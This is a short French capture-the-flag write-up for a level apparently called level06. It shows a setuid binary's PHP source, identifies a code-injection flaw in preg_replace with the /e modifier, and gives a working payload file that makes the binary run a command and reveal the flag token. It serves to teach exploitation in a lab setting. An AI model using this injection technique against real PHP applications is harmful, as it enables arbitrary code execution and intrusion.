# Level 06

1) Voici ce que nous donne `ls`

```bash
ls -la
total 24
dr-xr-x---+ 1 level06 level06  140 Mar  5  2016 .
d--x--x--x  1 root    users    340 Aug 30  2015 ..
-r-x------  1 level06 level06  220 Apr  3  2012 .bash_logout
-r-x------  1 level06 level06 3518 Aug 30  2015 .bashrc
-rwsr-x---+ 1 flag06  level06 7503 Aug 30  2015 level06
-rwxr-x---  1 flag06  level06  356 Mar  5  2016 level06.php
-r-x------  1 level06 level06  675 Apr  3  2012 .profile
```

2) Nous avons deux fichiers interessants: `level06` et `level06.php`. L'un est un binaire executable et l'autre le code source de ce binaire en php.

3) Voici ce que contient `level06.php`

```bash
#!/usr/bin/php
<?php
function y($m) {
    $m = preg_replace("/\./", " x ", $m); $m = preg_replace("/@/", " y", $m);
    return $m;
}

function x($y, $z) {
    $a = file_get_contents($y);
    $a = preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a);
    $a = preg_replace("/\[/", "(", $a); $a = preg_replace("/\]/", ")", $a);
    return $a;
}

$r = x($argv[1], $argv[2]); print $r;
?>
```

La faille se trouve sur cette ligne:

```php
$a = preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a);
```

PHP pourra grace a cette ligne executer du code arbitraire si la ligne que nous lui passons respecte ce format:


```
[x {${commande}}]
```

Donc nous pouvons faire ceci:

```bash
cat /tmp/exploit.sh
[x {${exec(getflag)}}]

./level06 /tmp/exploit.sh
PHP Notice:  Use of undefined constant getflag - assumed 'getflag' in /home/user/level06/level06.php(4) : regexp code on line 1
PHP Notice:  Undefined variable: Check flag.Here is your token : wiok45aaoguiboiki2tuin6ub in /home/user/level06/level06.php(4) : regexp code on line 1
```
